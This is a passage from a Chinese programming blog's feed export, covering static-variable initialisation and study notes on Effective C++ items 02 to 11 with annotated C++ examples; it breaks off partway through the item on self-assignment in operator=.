src="4.png"></p><blockquote><p><strong>总结：不同的初始化方式会导致局部静态变量在不同的位置被初始化，当然这也有可能受不同编译器的影响，也许在某些编译器上，其实现方式又会像之前老生常谈的一样，在第一次调用的时候进行初始化。</strong></p><ul><li>用常量初始化局部静态变量：在 main 函数之前进行初始化，行为类似于全局变量。</li><li>用变量初始化局部静态变量：在第一次调用的时候进行初始化，且保证线程安全性。</li></ul></blockquote>]]></content>
      
      
      <categories>
          
          <category> 底层原理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
            <tag> 编译 </tag>
            
            <tag> g++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>effective C++ 笔记</title>
      <link href="/2022/03/31/cpp-effective-c++/"/>
      <url>/2022/03/31/cpp-effective-c++/</url>
      
        <content type="html"><![CDATA[<h3 id="条款-02：尽量以-const，enum，inline-替换-define"><a href="#条款-02：尽量以-const，enum，inline-替换-define" class="headerlink" title="条款 02：尽量以 const，enum，inline 替换 #define"></a>条款 02：尽量以 const，enum，inline 替换 #define</h3><p><strong>1、指向常量的指针，同时也要限定指针本身为常量</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *<span class="keyword">const</span> authorName = <span class="string">&quot;Scott Meyers&quot;</span>; <span class="comment">// 在指定指针常量的时候，同时限定指针本身和其指向的空间都为常量</span></span><br><span class="line"><span class="function"><span class="keyword">const</span> std::string <span class="title">authorName1</span><span class="params">(<span class="string">&quot;Scott Meyers&quot;</span>)</span></span>; <span class="comment">// 用string来代替指针</span></span><br></pre></td></tr></table></figure><p><strong>2、类的 static const int 成员需要注意的点</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GamePlayer</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">float</span> NumScores = <span class="number">10.1</span>; <span class="comment">// 编译报错，只允许&quot;in-class&quot;的整数常量</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">int</span> NumTurns = <span class="number">5</span>;  <span class="comment">// 常量声明式</span></span><br><span class="line">    <span class="keyword">int</span> scores[NumTurns];           <span class="comment">// 编译器必须在编译的时候就知道NumTurns的大小，所以其必须是一个常量或者常量表达式 </span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> GamePlayer::NumTurns;     <span class="comment">// 变量声明式，由于其在声明的时候已经给定了初值，所以定义的时候不可以再设初值（该定义式一般写在cpp文件中，因为其需要分配内存的，需要在整个程序中唯一）</span></span><br></pre></td></tr></table></figure><p>注意：一般来说这种在类里面给出了初值的 static const int 成员，只要不取其地址或者编译强制要求其定义式，是可以不提供定义式的，因为这个行为在编译前端就可以完全确定，可以进行变量的数值替换。而不取其内存的话，是不需要一个定义式为其分配内存的，这应该算是一种编译技术吧。</p><p><strong>3、the enum hack （一个枚举类型的数值可以权当 int 使用）的使用场景</strong></p><ul><li>对于一些旧式的编译器，它们不允许 static 成员在其声明式上获得初值.。</li><li>这种 in-class 初值设定也只允许对<strong>整数常量</strong>进行。</li></ul><p>那如果在类的声明里面需要一个常量值怎么办呢？这种常量值需要在编译期就确定，比如说栈里面数组的 size 值，因为这个会影响到编译器的代码生成，其在生成代码的时候就必须知道要分配多少栈帧，所以这个常量值必须在编译前端就能获取到。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GamePlayer1</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="class"><span class="keyword">enum</span> &#123;</span> NumTurns = <span class="number">5</span> &#125;;<span class="comment">// the enum hack --- 令NumTurns成为5的一个记号名称</span></span><br><span class="line">    <span class="keyword">int</span> scores[NumTurns]; <span class="comment">// 编译器必须在编译的时候就知道NumTurns的大小</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><hr><h3 id="条款-03：尽可能使用-const"><a href="#条款-03：尽可能使用-const" class="headerlink" title="条款 03：尽可能使用 const"></a>条款 03：尽可能使用 const</h3><p><strong>1、STL 迭代器中的 const</strong></p><p>将迭代器本身声明为 const 就像声明指针为 const 一样（即声明一个 T* const 指针），表示这个<strong>迭代器不能指向其他东西</strong>；期望<strong>迭代器所指向的东西带有常量属性</strong>则使用 const_iterator。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">std::vector&lt;<span class="keyword">int</span>&gt; vec;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> std::vector&lt;<span class="keyword">int</span>&gt;::iterator iter = vec.<span class="built_in">begin</span>();<span class="comment">// iter是常量迭代器，只能指向vec的第一个元素</span></span><br><span class="line">std::vector&lt;<span class="keyword">int</span>&gt;::const_iterator cIter = vec.<span class="built_in">cbegin</span>();<span class="comment">// cIter是指向常量的迭代器，表示不能通过该迭代器修改其指向的元素</span></span><br></pre></td></tr></table></figure><p><strong>2、通过 const 避免一些不期望的与内置类型不兼容的操作</strong></p><p>在内置类型的运算中，表达式 <code>(a*b)=c</code> 是不能通过编译的语法检查的，那我们自定义的类型中也要保证这个语法特性，防止用户在使用到这种不期望的语法时编译器会给出错误提示。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Rational</span> &#123;</span> ... &#125;;</span><br><span class="line"><span class="keyword">const</span> Rational <span class="keyword">operator</span>*(<span class="keyword">const</span> Rational &amp;lhs, <span class="keyword">const</span> Rational &amp;rhs);</span><br><span class="line"><span class="comment">// 如果乘法运算符重载函数的返回值没有用const修饰的话，那么(a*b)=c 这样的语法使用就不会报出编译错误了。</span></span><br></pre></td></tr></table></figure><p><strong>3、bitwise constness 和 logical constness</strong></p><p><strong>原则：</strong><font color=red>我们要遵循 C++ 中 bitwise constness 的规则，但要写出 logical constness 的代码。</font></p><p>首先解释这两个概念的含义：</p><ul><li>bitwise constness：成员函数只有在不更改对象的任何成员变量时才可以说是 const，这也是 <strong>C++ 中对常量性</strong>的定义。假设你将一个成员函数声明为 const，那这个对象中的任何成员都不能通过这个成员函数改变，但是如果这些成员变量中有指针呢？即使将成员函数声明为了 const，但指针的指向的空间仍然是可以被这个声明为 const 的成员函数改变的！</li><li>logical constness：一个 const 成员函数可以修改他所处理的对象内的某些 bits，但只有在客户端侦测不出来的情况下改变。</li></ul><p>假设我们要设计一个文本块类，其中文本用一个 char * 的类型保存着，如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CTextBlock</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">CTextBlock</span>(<span class="keyword">const</span> <span class="keyword">char</span> *name) &#123;</span><br><span class="line">        pText = <span class="keyword">new</span> <span class="keyword">char</span>[<span class="built_in">strlen</span>(name)+<span class="number">1</span>];</span><br><span class="line">        <span class="built_in">strcpy</span>(pText, name);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">char</span> &amp;<span class="keyword">operator</span>[](std::<span class="keyword">size_t</span> position) <span class="keyword">const</span> &#123; <span class="keyword">return</span> pText[position]; &#125;</span><br><span class="line">    <span class="comment">// const 的成员函数返回了指向non-const的指针</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">char</span> *pText;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">const</span> CTextBlock <span class="title">mathBlock</span><span class="params">(<span class="string">&quot;Mathematics&quot;</span>)</span></span>;</span><br><span class="line">    mathBlock[<span class="number">1</span>]=<span class="string">&#x27;L&#x27;</span>;   <span class="comment">// 会将M修改为L，虽然我们的类满足了bitwise constness的规则，但是这显然不是我们希望发生的，因为mathBlock已经被声明成了const，我们不希望代表其名称的域被修改</span></span><br><span class="line">    <span class="comment">//所以解决方案是将运算符[]的const重载函数返回值类型修改为const char&amp;，这就是logical constness需要关注的事。</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同样还有一种 case，假如上述的 CTextBlock class 有可能高速缓存文本区块的长度以便应付查询：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CTextBlock</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">CTextBlock</span>(<span class="keyword">const</span> <span class="keyword">char</span> *name) &#123;</span><br><span class="line">        pText = <span class="keyword">new</span> <span class="keyword">char</span>[<span class="built_in">strlen</span>(name) + <span class="number">1</span>];</span><br><span class="line">        <span class="built_in">strcpy</span>(pText, name);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> &amp;<span class="keyword">operator</span>[](std::<span class="keyword">size_t</span> position) <span class="keyword">const</span> &#123; <span class="keyword">return</span> pText[position]; &#125;</span><br><span class="line">    <span class="comment">// 返回值类型加了const修饰，所以不能更改</span></span><br><span class="line">    <span class="function">std::<span class="keyword">size_t</span> <span class="title">getLength</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!lengthIsValid) &#123;</span><br><span class="line">            textLength = <span class="built_in">strlen</span>(pText);<span class="comment">// const成员函数按道理是不能修改成员的，但由于成员被声明为mutable，所以使得这种操作成为了可能，这也是logical constness应该考虑的事！</span></span><br><span class="line">            lengthIsValid = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> textLength;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">char</span> *pText;</span><br><span class="line">    <span class="keyword">mutable</span> std::<span class="keyword">size_t</span> textLength;<span class="comment">// mutable使得变量总是可以被更改，即使在一个const对象内</span></span><br><span class="line">    <span class="keyword">mutable</span> <span class="keyword">bool</span> lengthIsValid;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>4、消除 const 和 non-const 成员函数的代码冗余</strong></p><p>若一个类的 const 成员函数和其对应的 non-const 成员函数中的代码是大致相似的，我们可以通过让非 const 成员函数调用 const 成员函数来减少代码冗余。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TextBlock</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> &amp;<span class="keyword">operator</span>[](std::<span class="keyword">size_t</span> position) <span class="keyword">const</span> &#123;</span><br><span class="line">        ...</span><br><span class="line">        ...</span><br><span class="line">        ... </span><br><span class="line">        <span class="keyword">return</span> text[position];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> &amp;<span class="keyword">operator</span>[](std::<span class="keyword">size_t</span> position) &#123;</span><br><span class="line">        ...</span><br><span class="line">        ...</span><br><span class="line">        ...</span><br><span class="line">         <span class="keyword">return</span> <span class="keyword">const_cast</span>&lt;<span class="keyword">char</span> &amp;&gt;(</span><br><span class="line">             <span class="keyword">static_cast</span>&lt;<span class="keyword">const</span> TextBlock &amp;&gt;(*<span class="keyword">this</span>)</span><br><span class="line">             [position]);</span><br><span class="line">        <span class="comment">// 先用static_cast转换将其转换成</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    std::string text;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><hr><h3 id="条款-04：确定对象在使用前已经被初始化"><a href="#条款-04：确定对象在使用前已经被初始化" class="headerlink" title="条款 04：确定对象在使用前已经被初始化"></a>条款 04：确定对象在使用前已经被初始化</h3><p><strong>1、局部变量的初始化</strong></p><p>函数中的局部变量内存都是在栈里面被分配的，所以在使用前如果不初始化，则行为是未定义的，因为我们不知道栈里面由以前释放的栈帧中的值是什么。</p><p>对于类的构造函数，其初始化动作并不是发生在函数体，而是发生在<strong>成员初始化列表</strong>中，其初始化的顺序和成员变量在类中声明的顺序一致。</p><p><strong>2、不同编译单元内 non-local static 对象的初始化</strong></p><ul><li>static 对象：包括全局对象，定义于命名空间中的对象，在 class 内、函数内和文件作用域内被声明为 static 的对象。</li><li>local static 对象：函数内的 static 对象。</li><li>non-local static 对象：除了函数内的 static 对象之外的其他 static 对象。</li></ul><p><font color=red>编译单元间 non-local static 对象的初始化顺序是<strong>未定义的</strong>，这将导致一个问题：如果一个编译单元内的某个 non-local static 对象的初始化动作使用了另外一个编译单元内某个 non-local static 对象，则它所用到的这个对象可能未被初始化</font></p><p>那么应该怎么解决上述的问题呢？<strong>将 non-local static 对象转变成包装在函数中的 local static 对象！！</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// file_A.cpp</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileSystem</span> &#123;</span></span><br><span class="line">    <span class="function">std::<span class="keyword">size_t</span> <span class="title">numDisks</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function">FileSystem &amp;<span class="title">tfs</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> FileSystem fs;</span><br><span class="line">    <span class="keyword">return</span> fs;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// file_B.cpp</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Directory</span> &#123;</span>...&#125;;</span><br><span class="line"><span class="function">Directory &amp;<span class="title">Directory</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">    std::<span class="keyword">size_t</span> disks = <span class="built_in">tfs</span>().<span class="built_in">numDisks</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Diretory tempDir; <span class="comment">// 假设我们在 A 文件中把 fs 声明成全局变量，而 B 文件中 tempDir 也是全局变量，但是 tempDir 的构造函数需要用到 fs，那在创建 tempDir 这个全局变量的时候， fs 还不一定已经初始化过了，这将造成未定义的行为。但是将 fs 包装在函数中用 static 修饰，在 tempDir 调用默认构造函数的时候就一定可以保证先初始化 fs，因为其需要调用函数 tfs。</span></span><br></pre></td></tr></table></figure><hr><h3 id="条款-05：了解-C-默认编写并调用了哪些函数"><a href="#条款-05：了解-C-默认编写并调用了哪些函数" class="headerlink" title="条款 05：了解 C++ 默认编写并调用了哪些函数"></a>条款 05：了解 C++ 默认编写并调用了哪些函数</h3><p>编译器可以暗自为 class 创建<strong>默认构造函数</strong>、<strong>拷贝构造函数</strong>、<strong>拷贝赋值操作符</strong>、<strong>移动赋值操作符</strong>、<strong>移动构造函数</strong>和<strong>析构函数</strong>。但是 C++ 一定会为每一个类生成这些函数吗？不！仅仅在<strong>需要用到且确实可以用到</strong>的时候才会生成。</p><ul><li>如果用户自定义了构造函数，则不会再生成默认构造函数。</li><li>如果你打算在一个 “内含 reference 成员” 的 class 内支持赋值操作，则必须自定义赋值操作符，因为默认版本就是对每个对象进行赋值，这违反了 reference 不能重新赋值的约定。</li><li>对于“内含 const 成员”的 class，编译器的反应也一样，与上一条同理。</li><li>如果某个 base class 将以上赋值操作符声明为 private，编译器也会拒绝为其 derived class 自动生成赋值操作符，因为其 derived class 无权调用 base class 的赋值操作符。</li></ul><hr><h3 id="条款-06：若不想使用编译器自动生成的函数，就该明确拒绝"><a href="#条款-06：若不想使用编译器自动生成的函数，就该明确拒绝" class="headerlink" title="条款 06：若不想使用编译器自动生成的函数，就该明确拒绝"></a>条款 06：若不想使用编译器自动生成的函数，就该明确拒绝</h3><p>如果希望我们创建的对象是独一无二，不可复制的，只需要将拷贝构造函数和拷贝赋值操作符声明为 private 即可。这种方式存在一个缺点，因为类中的成员函数还可以调用被声明为 private 的拷贝构造函数和拷贝赋值操作符，所以在编译的时候并不会报错，而是<strong>在链接的时候报无法找到定义的链接错误</strong>，因为确实，我们仅仅声明了它们，而没有实现它们的定义。</p><p>为了将链接期的错误转移到编译期，也可使用如下的代码作为基类来传递不可赋值性。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Uncopyable</span> &#123;</span></span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">    <span class="built_in">Uncopyable</span>() &#123; &#125;</span><br><span class="line">    ~<span class="built_in">Uncopyable</span>() &#123; &#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="built_in">Uncopyable</span>(<span class="keyword">const</span> Uncopyable&amp;);<span class="comment">// 阻止拷贝</span></span><br><span class="line">    Uncopyable &amp;<span class="keyword">operator</span>=(<span class="keyword">const</span> Uncopyable&amp;);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HomeForSale</span> :</span> <span class="keyword">private</span> Uncopyable &#123;</span><br><span class="line">    <span class="comment">// 由于继承了基类的不可拷贝性，所以其不再可以发生拷贝和赋值操作</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>[注]：在 C++11 中，完全可以用 delete 关键字取代上述的操作！</p></blockquote><hr><h3 id="条款-07：为多态基类声明-virtual-析构函数"><a href="#条款-07：为多态基类声明-virtual-析构函数" class="headerlink" title="条款 07：为多态基类声明 virtual 析构函数"></a>条款 07：为多态基类声明 virtual 析构函数</h3><p><strong>1、virtual 关键字对析构函数的影响</strong></p><ul><li><p>如果析构函数没有被声明为了 virtual 函数，则其派生的类有可能发生内存泄漏。</p></li><li><p>那所有的类的析构函数都需要声明为析构函数吗？不是，一种经验的做法是，<strong>只有当 class 内含有至少一个 virtual 函数，才为它声明 virtual 析构函数</strong> 。如果 class 的目的不是为了作为 base class 使用，或者不是为了具备多态性，也不该声明 virtual 函数。</p></li><li><p>在我们设计类的时候，如果我们的类没有任何的虚函数，例如 STL，这表明我们可能不希望我们的类被任何类继承（因为被继承后在 delete 的时候有可能不小心造成内存泄漏），应该把类用 <strong>final</strong> 关键字修饰。</p></li></ul><p><strong>2、纯虚函数也可以定义！</strong></p><p>假设我们需要一个 abstract class，但是又没有合适的虚函数可以用，那我们可以将其析构函数声明为纯虚函数，以此让该类达到抽象类的功能。但是，这也使得我们必须给出析构函数的定义，因为其 derived class 会简介的调用基类的析构函数，如果没有定义，则链接器会报链接错误。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AWOV</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">virtual</span> ~<span class="built_in">AWOV</span>() = <span class="number">0</span>;<span class="comment">// 声明 pure virtual 析构函数</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">AWOV::~<span class="built_in">AWOV</span>() &#123; &#125;<span class="comment">// 纯虚析构函数的定义，如果缺少的话，在析构其继承类的对象时会有链接错误</span></span><br></pre></td></tr></table></figure><hr><h3 id="条款-08：别让异常逃离析构函数"><a href="#条款-08：别让异常逃离析构函数" class="headerlink" title="条款 08：别让异常逃离析构函数"></a>条款 08：别让异常逃离析构函数</h3><p>如果异常可以逃离析构函数，可能会导致不明确行为。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DBConnection</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">static</span> DBConnection <span class="title">create</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">close</span><span class="params">()</span></span>;<span class="comment">// 该函数可能会抛出异常    </span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DBConn</span> &#123;</span></span><br><span class="line">~<span class="built_in">DBConn</span>() &#123;</span><br><span class="line">  db.<span class="built_in">close</span>();<span class="comment">// 调用了可能发生异常的函数，该析构函数可能抛出异常      </span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    DBConnection db;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 解决方案一：在析构函数中抓住异常，并且终止程序</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DBConn</span> &#123;</span></span><br><span class="line">~<span class="built_in">DBConn</span>() &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123; db.<span class="built_in">close</span>(); &#125;</span><br><span class="line">        <span class="built_in"><span class="keyword">catch</span></span>(...) &#123;</span><br><span class="line">            <span class="comment">// 可以在终止程序前记录下失败的信息反馈给用户</span></span><br><span class="line">            std::<span class="built_in">abort</span>();</span><br><span class="line">        &#125;   </span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    DBConnection db;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 解决方案二：吞掉异常，但可能导致程序后续执行出现问题</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DBConn</span> &#123;</span></span><br><span class="line">~<span class="built_in">DBConn</span>() &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123; db.<span class="built_in">close</span>(); &#125;</span><br><span class="line">        <span class="built_in"><span class="keyword">catch</span></span>(...) &#123;</span><br><span class="line">            <span class="comment">// 记录下失败的信息反馈给用户</span></span><br><span class="line">        &#125;   </span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    DBConnection db;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 解决方案三：提供可能抛出异常的函数的接口给用户，让用户可以选择性的自己处理</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DBConn</span> &#123;</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">close</span><span class="params">()</span> </span>&#123;<span class="comment">// 提供给用户的接口</span></span><br><span class="line">        db.<span class="built_in">close</span>();</span><br><span class="line">        closed = <span class="literal">true</span>;<span class="comment">// 关闭成功，在析构中不再执行该函数</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">~<span class="built_in">DBConn</span>() &#123;</span><br><span class="line">        <span class="keyword">if</span>(!closed) &#123;<span class="comment">// 如果用户没有使用关闭接口，则析构函数再调用</span></span><br><span class="line">            <span class="keyword">try</span> &#123; db.<span class="built_in">close</span>(); &#125;</span><br><span class="line">        <span class="built_in"><span class="keyword">catch</span></span>(...) &#123;</span><br><span class="line">            <span class="comment">// 记录下失败的信息反馈给用户</span></span><br><span class="line">        &#125;</span><br><span class="line">        &#125;   </span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    DBConnection db;</span><br><span class="line">    <span class="keyword">bool</span> closed;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><hr><h3 id="条款-09：绝不在构造和析构的过程中调用-virtual-函数"><a href="#条款-09：绝不在构造和析构的过程中调用-virtual-函数" class="headerlink" title="条款 09：绝不在构造和析构的过程中调用 virtual 函数"></a>条款 09：绝不在构造和析构的过程中调用 virtual 函数</h3><ul><li>在构造函数中，virtual 绝不会下降到 derived class 阶层，因为 base class 的构造动作发生在 derived class 之前，此时还没有完全生成 derived class。<strong>如果可以分析汇编代码的话，可以发现 base class 的构造函数会将该类的第一个内存区域（也就是虚表指针的值）初始化成当前 base class 的虚表地址，所以在其构造函数中调用的函数永远是 base class 中所实现的虚函数。</strong></li><li>对于析构函数，一旦 derived class 析构函数开始执行，则对象中的 derived class 成员变量变为未知值，所以在执行其 base class 的析构函数内，不可能调用到 derived  class 中重写的虚函数。<strong>分析汇编代码其实可以看出，在 base class 析构函数的开始处，会先把当前对象的虚表指针的值修改为指向 base class 的虚表，所以在 base class 析构函数中无论怎么样，都只能调用其本身的虚函数。</strong></li></ul><hr><h3 id="条款-10：令-operator-返回一个-reference-to-this"><a href="#条款-10：令-operator-返回一个-reference-to-this" class="headerlink" title="条款 10：令 operator= 返回一个 reference to *this"></a>条款 10：令 operator= 返回一个 reference to *this</h3><p>对于内置类型，经常会有如此连锁形式的赋值：<code>x = y = z;</code></p><p>为了实现“连锁赋值”，赋值操作符必须返回一个 reference 指向操作符的左侧实参。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Widget</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    Widget &amp;<span class="keyword">operator</span>=(<span class="keyword">const</span> Widget &amp; rhs) &#123;</span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><hr><h3 id="条款-11：在-operator-中处理自赋值"><a href="#条款-11：在-operator-中处理自赋值" class="headerlink" title="条款 11：在 operator= 中处理自赋值"></a>条款 11：在 operator= 中处理自赋值</h3><p>一种不安全的 operator= 的实现方式，可能造成 use after free！</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span 